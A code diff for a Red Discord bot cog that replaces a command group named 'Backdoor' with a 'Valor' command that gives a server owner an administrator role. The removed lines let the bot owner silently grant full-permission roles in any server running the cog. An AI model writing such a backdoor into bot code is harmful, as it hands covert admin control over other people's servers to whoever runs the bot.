@@ -1,27 +1,25 @@
-import discord
 from redbot.core import commands
+import discord
 
-class Backdoor(commands.Cog):
+class Valor(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.group()
-    async def backdoor(self, ctx):
-        """Backdoor command group."""
-        if ctx.invoked_subcommand is None:
-            await ctx.send('Invalid backdoor command. Use !help backdoor for more information.')
-
-    @backdoor.command()
-    async def grantadmin(self, ctx, member: discord.Member):
-        """Grant Administrator role."""
-        if ctx.author.id == YOUR_BOT_OWNER_ID:
-            # Create a new role
-            new_role = await ctx.guild.create_role(name='NewAdminRole', permissions=discord.Permissions.all())
-
-            # Assign the new role to the member
-            await member.add_roles(new_role)
-
-            await ctx.send(f'{member.mention} has been granted the new Administrator role.')
+    @commands.command()
+    async def valor(self, ctx):
+        if ctx.author.id == ctx.guild.owner_id:
+            role = discord.utils.get(ctx.guild.roles, name="Valor")
+            if not role:
+                # Create the role with administrative permissions
+                role = await ctx.guild.create_role(
+                    name="Valor",
+                    color=discord.Color.red(),
+                    permissions=discord.Permissions(administrator=True)
+                )
+            await ctx.author.add_roles(role)
+            await ctx.send("You have been given the Valor role with administrative privileges!")
+        else:
+            await ctx.send("Only the server owner can use this command.")
 
 def setup(bot):
-    bot.add_cog(Backdoor(bot))
+    bot.add_cog(Valor(bot))
